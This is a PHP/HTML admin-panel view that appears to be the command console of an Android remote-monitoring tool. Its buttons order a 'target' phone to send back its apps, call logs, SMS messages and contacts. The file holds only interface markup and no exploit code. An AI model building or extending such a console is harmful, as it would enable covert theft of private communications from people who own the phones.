    <link href="<?php echo base_url('assets/plugins/toastr/toastr.min.css'); ?>" rel="stylesheet" type="text/css"/>
    <!-- Content Wrapper. Contains page content -->
    <div class="content-wrapper">
        <!-- Content Header (Page header) -->
        <section class="content-header">
            <div class="container-fluid">
                <div class="row mb-2">
                    <div class="col-sm-6">
                        <h1>Send a request to phone</h1>
                    </div>
                    <div class="col-sm-6">
                        <ol class="breadcrumb float-sm-right">
                            <li class="breadcrumb-item"><a href="#">Home</a></li>
                            <li class="breadcrumb-item active">Commands</li>
                        </ol>
                    </div>
                </div>
            </div>
            <!-- /.container-fluid -->
        </section>
        <!-- Main content -->
        <section class="content">
            <!-- Default box -->
            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">Command Request</h3>
                    <div class="card-tools">
                        <button type="button" class="btn btn-tool" data-card-widget="collapse" title="Collapse">
                            <i class="fas fa-minus"></i>
                        </button>
                        <button type="button" class="btn btn-tool" data-card-widget="remove" title="Remove">
                            <i class="fas fa-times"></i>
                        </button>
                    </div>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-12 col-md-12 col-lg-8 order-2 order-md-1">
                            <div class="row">

                                <div class="col-md-6 col-sm-6 col-12">
                                    <div class="info-box">
                                        <span class="info-box-icon bg-info"><i class="fab fa-android"></i></span>
                                        <div class="info-box-content">
                                            <span class="info-box-text">Fetch Apps</span>
                                            <button class="btn btn-block btn-outline-primary req_apps">
                                                            <span class="req_apps_class">
                                                                <i class="fab fa-android"></i>&nbsp;&nbsp; Request Apps
                                                            </span>
                                            </button>
                                            <p>
                                                <small>
                                                    <i>To request the target android device to fetch all Apps.</i>
                                                </small>
                                            </p>
                                            <div>
                                                <span class="direct-chat-timestamp float-right">Last Used <strong
                                                            class="req_apps_last">  <?php echo date('F d H:i:s a', time()); ?>  </strong> </span>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <div class="col-md-6 col-sm-6 col-12">
                                    <div class="info-box">
                                        <span class="info-box-icon bg-info"><i class="fas fa-phone-square-alt"></i></span>
                                        <div class="info-box-content">
                                            <span class="info-box-text">Fetch Call Logs</span>
                                            <button class="btn btn-block btn-outline-primary req_calls">
                                                            <span class="req_calls_class">
                                                                <i class="fas fa-phone-square-alt"></i>&nbsp;&nbsp; Request Call Logs
                                                            </span>
                                            </button>
                                            <p>
                                                <small>
                                                    <i>To request the target android device to fetch all Call logs.</i>
                                                </small>
                                            </p>
                                            <div>
                                                <span class="direct-chat-timestamp float-right">Last Used <strong
                                                            class="req_calls_last">  <?php echo date('F d H:i:s a', time()); ?>  </strong> </span>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <div class="col-md-6 col-sm-6 col-12">
                                    <div class="info-box">
                                        <span class="info-box-icon bg-info"><i class="fas fa-sms"></i></span>
                                        <div class="info-box-content">
                                            <span class="info-box-text">Fetch SMS</span>
                                            <button class="btn btn-block btn-outline-primary req_sms">
                                                            <span class="req_sms_class">
                                                                <i class="fas fa-sms"></i>&nbsp;&nbsp; Request SMS
                                                            </span>
                                            </button>
                                            <p>
                                                <small>
                                                    <i>To request the target android device to fetch all SMS.</i>
                                                </small>
                                            </p>
                                            <div>
                                                <span class="direct-chat-timestamp float-right">Last Used <strong
                                                            class="req_sms_last">  <?php echo date('F d H:i:s a', time()); ?>  </strong> </span>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <div class="col-md-6 col-sm-6 col-12">
                                    <div class="info-box">
                                        <span class="info-box-icon bg-info"><i class="fas fa-id-card"></i></span>
                                        <div class="info-box-content">
                                            <span class="info-box-text">Fetch Contacts</span>
                                            <button class="btn btn-block btn-outline-primary req_contacts">
                                                            <span class="req_contacts_class">
                                                                <i class="fas fa-id-card"></i>&nbsp;&nbsp; Request Contacts
                                                            </span>
                                            </button>
                                            <p>
                                                <small>
                                                    <i>To request the target android device to fetch all Contacts.</i>
                                                </small>
                                            </p>
                                            <div>
                                                <span class="direct-chat-timestamp float-right">Last Used <strong
                                                            class="req_contacts_last"> <?php echo date('F d H:i:s a', time()); ?> </strong> </span>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <div class="col-md-6 col-sm-6 col-12">
                                    <div class="info-box">
                                        <span class="info-box-icon bg-info"><i class="fas fa-file-alt"></i></span>
                                        <div class="info-box-content">
                                            <span class="info-box-text">Fetch All</span>
                                            <button class="btn btn-block btn-outline-primary req_all">
                                                            <span class="req_all_class">
                                                                <i class="fas fa-file-alt"></i>&nbsp;&nbsp; Request All Data
                                                            </span>
                                            </button>
                                            <p>
                                                <small>
                                                    <i>To request the target android device to fetch all Contacts.</i>
                                                </small>
                                            </p>
                                            <div>
                                                <span class="direct-chat-timestamp float-right">Last Used <strong
                                                            class="req_all_last">  <?php echo date('F d H:i:s a', time()); ?>  </strong> </span>
                                            </div>
                                        </div>
                                    </div>
                                </div>

                            </div>
                        </div>


                        <div class="col-12 col-md-12 col-lg-4 order-1 order-md-2">
                            <h3 class="text-primary">
                                <i class="fas fa-paint-brush"></i> How it works.
                            </h3>
                            <p class="text-muted">
                                Several factors have to be inline such that the commands are processed properly by the phone
                                and the expected result is gotten.
                            </p>
                            <h5 class="text-muted">Requirements.</h5>
                            <ul class="list-unstyled">
                                <li>
                                    <a href="" class="btn-link text-secondary">
                                        <i class="fas fa-dot-circle"></i></i> The device has internet access.
                                    </a>
                                </li>
                                <li>
                                    <a href="" class="btn-link text-secondary">
                                        <i class="fas fa-dot-circle"></i></i> The permissions on the device have to be
                                        granted.
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
                <!-- /.card-body -->
            </div>
            <!-- /.card -->
        </section>
        <!-- /.content -->
    </div>
    <!-- /.content-wrapper -->
